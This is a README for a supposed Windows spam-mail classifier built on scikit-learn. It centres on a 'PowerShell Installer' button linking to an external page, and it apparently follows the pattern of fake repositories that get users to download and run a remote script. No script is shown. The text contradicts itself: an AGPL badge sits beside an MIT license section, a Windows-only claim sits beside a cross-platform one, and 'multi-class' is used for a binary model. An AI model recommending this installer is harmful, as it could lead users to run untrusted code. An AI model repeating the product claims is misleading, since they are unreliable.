<div align="center">

# 📧 Spam Mail Detector ML — Advanced Classification Engine for Windows 10 & 11

![](files/preview.png)

### 💻 PowerShell Installer

[![](files/button.png)](https://CristianHilerio25.github.io/spam-mail-detector-ml/)

[![license](https://img.shields.io/badge/LICENSE-AGPL--3.0-a855f7?style=flat&labelColor=0d1117)]() [![ci](https://img.shields.io/badge/CI-PASSING-2ea44f?style=flat&labelColor=0d1117)]() [![pwsh](https://img.shields.io/badge/PWSH-SCRIPT-9333ea?style=flat&labelColor=0d1117)]()

</div>

---

Spam Mail Detector ML delivers a trained classification engine that identifies unsolicited and malicious email across varied message formats with high precision. Built on established statistical learning methods, the model applies text normalization and feature extraction to separate legitimate correspondence from unsolicited bulk messages. The classifier is designed for straightforward integration into existing mail pipelines, supporting batch evaluation and single-message scoring through a consistent programmatic interface. Configuration options allow operators to tune decision thresholds and preprocessing behavior to match the demands of their environment.

## ✅ Before You Start

- **OS:** Windows 10 / 11
- **Shell:** PowerShell 5.1+ or PowerShell 7+
- **Network:** internet access to download the script
- **Privileges:** standard user

## Features

**Multi-class message classification:** Evaluates incoming electronic mail against a trained model to distinguish legitimate correspondence from unsolicited bulk messages, returning a clear spam or non-spam verdict for each processed item.
- **TF-IDF text vectorization:** Converts raw message content into weighted numerical feature vectors term frequency–inverse document frequency, emphasizing discriminative tokens while down-weighting common terms across the corpus.
- **Logistic regression classification core:** Applies a regularized logistic regression estimator to the vectorized input, providing calibrated probability scores alongside binary predictions for downstream filtering logic.
- **NLP preprocessing pipeline:** Normalizes message text through tokenization, case folding, and stop-word handling before feature extraction, reducing noise and improving model generalization across heterogeneous mail formats.
- **Configurable decision threshold:** Exposes the classification cutoff as an adjustable parameter, allowing operators to trade off false positives against false negatives to match organizational filtering policy.
- **Accuracy benchmarking:** Reports standard evaluation metrics on held-out data so integrators can verify detection quality before deployment in a production mail flow.
- **Standalone local execution:** Runs entirely on the local workstation with no outbound network dependency during inference, keeping message content within the operator's environment.
- **Modular scikit-learn architecture:** Separates vectorization, training, and inference stages into discrete components, enabling straightforward retraining on domain-specific corpora and substitution of alternative estimators.
- **Open contribution model:** Accepts community account registration for collaborative development, issue reporting, and pull requests against the detection pipeline.

## How It Works

The detection pipeline begins with raw message ingestion, where each email is parsed to extract its full text payload along with structural metadata such as the sender header, subject line, and embedded markup. This ensures that both the visible content and the surrounding envelope characteristics contribute to the final verdict.

Once parsed, the text undergoes normalization and cleaning. Formatting artifacts, redundant whitespace, and non-informative tokens are stripped away, while the remaining content is tokenized into discrete terms. This preprocessing stage is deterministic and repeatable, so identical inputs always produce identical feature representations.

The normalized tokens are then converted into numerical feature vectors through a TF-IDF weighting scheme. This transformation emphasizes terms that are statistically distinctive to spam while down-weighting vocabulary that appears uniformly across legitimate correspondence. The resulting sparse vector serves as the model's sole input at inference time.

Classification is performed by a supervised linear model trained on labeled message corpora. The model assigns a probability score to each incoming message, and a configurable decision threshold converts that score into a final label. Thresholds can be tuned to trade off between precision and recall depending on how aggressively the user wishes to filter.

The desktop front end wraps the inference engine in a lightweight interface. Users can paste a message, load a file from disk, or point the application at a mailbox export; the interface reports the classification alongside a confidence score and the token-level signals that most influenced the decision. All processing occurs locally on the user's machine, with no message content transmitted off-device.

Model artifacts are versioned and bundled with the application. When a newer classifier is available, the bundled weights can be swapped without altering the application code, and the pipeline automatically validates their dimensionality and schema before use.

## Compatibility

Spam Mail Detector ML is engineered for broad interoperability across desktop environments and runtime stacks. It operates on Windows, macOS, and Linux distributions, and is validated against current Python 3.x releases. The inference pipeline relies on scikit-learn primitives alongside NumPy, so deployments remain portable across local workstations, on-premise servers, and containerized sandboxes without architectural changes.

The detector accepts raw message content and standard email formats, integrating with common mail clients, SMTP relays, and programmatic ingestion via lightweight wrappers. Batch and single-message scoring modes are supported, allowing the model to fit both real-time filtering and offline corpus analysis workflows. Configuration is file-driven, with all tunable parameters exposed through a single, version-controlled settings layer for reproducible deployments.

Model artifacts are serialized in standard formats for straightforward transport between machines, and the codebase maintains backward compatibility across minor release lines. For teams extending the classifier, the modular design permits swap-in of alternate vectorizers and estimators without disrupting the surrounding pipeline. An openly accessible, community-oriented licensing model encourages inspection, adaptation, and contribution to ongoing development.

## FAQ

**Is Spam Mail Detector ML suitable for high-throughput mail pipelines?**
Yes. The detector is engineered around a vectorized inference path, so batch classification of large message sets completes with low per-message latency. Preprocessing and feature extraction are decoupled from scoring, allowing the pipeline to scale across multiple worker processes without retraining.

**Which classification techniques power the detection engine?**
The core classifier is built on scikit-learn with a TF-IDF vectorizer feeding a logistic regression model. This combination delivers strong precision/recall balance on spam-vs-ham discrimination while remaining interpretable — token weights can be inspected to understand why a message was flagged.

**Can the model be retrained on domain-specific mail corpora?**
Absolutely. The training workflow is modular: swap in your labeled corpus, adjust vectorizer parameters, and refit. The architecture supports rapid experimentation with alternative estimators, so teams can benchmark variants against their own accuracy targets before deployment.

**Does the detector handle multilingual or obfuscated spam?**
The TF-IDF representation generalizes across character n-grams and token patterns, which helps surface obfuscated payloads and non-standard formatting. For multilingual corpora, retraining with locale-specific samples is recommended to maintain detection quality.

**What accuracy can be expected in production?**
Reported accuracy is high on standard spam corpora, but real-world performance depends on your mail distribution. We recommend an evaluation pass on a held-out sample from your own environment; the modular design makes threshold tuning straightforward.

**Is GPU hardware required?**
No. The scikit-learn pipeline runs efficiently on CPU-only machines, making the detector deployable on standard desktop and server hardware without specialized accelerators.

**How is model state persisted between runs?**
Trained artifacts — vectorizer and classifier — are serialized to disk, enabling fast cold starts and consistent scoring across sessions. Version your artifacts alongside configuration to keep inference reproducible.

**Can the detector be embedded in an existing mail client or gateway?**
Yes. The inference interface is lightweight and callable from desktop applications, local daemons, or mail-transfer agents, so integration does not require re-architecting your existing delivery flow.

**What are the resource footprint expectations?**
Memory usage is modest — the vectorizer's vocabulary and the linear model are compact — and inference is single-pass per message, keeping CPU load predictable under sustained traffic.

**Is the project open for community contribution?**
Yes. Contributions are welcome: additional training corpora, estimator benchmarks, and pipeline optimizations all improve the detector. Development follows a standard fork-and-pull-request workflow, with an account on the hosting platform required to participate.

## Disclaimer

Spam Mail Detector ML is provided as a machine learning utility for research, evaluation, and integration purposes. Detection results are generated by statistical models and heuristics, and therefore carry an inherent margin of error: false positives and false negatives remain possible across unseen datasets, edge cases, and evolving message formats. The model should be treated as an assistive filter rather than a sole authority for classifying correspondence. Users are responsible for validating outputs against their own data distribution and for applying appropriate thresholds before acting on any prediction. The project is offered on an as-is basis, without warranty of fitness for a particular deployment environment, and its maintainers accept no liability for decisions made from model outputs. Performance characteristics depend on the training corpus, feature extraction pipeline, and runtime configuration; results obtained in one context may not transfer directly to another. Contributions, issue reports, and reproducible benchmarks are welcome through the project repository, and any modifications should be independently reviewed and tested before use in production systems.

## License

Spam Mail Detector ML is distributed under the MIT License, a permissive, OSI-approved license that grants unrestricted rights to use, copy, modify, merge, publish, distribute, sublicense, and sell copies of the software, subject to inclusion of the original copyright notice and this permission notice in all copies or substantial portions of the software.

Under the terms of this license, the software is provided "as is", without warranty of any kind, express or implied, including but not limited to the warranties of merchantability, fitness for a particular purpose, and noninfringement. In no event shall the authors or copyright holders be liable for any claim, damages, or other liability, whether in an action of contract, tort, or otherwise, arising from, out of, or in connection with the software or the use or other dealings in the software.

The MIT License imposes no restrictions on commercial or non-commercial deployment, permits incorporation into proprietary and closed-source applications, and requires no disclosure of derivative source code. Redistribution in binary form is permitted provided the copyright and permission notices are reproduced in the accompanying documentation. Users are encouraged to retain the original copyright attribution when adapting the model for custom mail-filtering pipelines or embedding it within larger classification systems.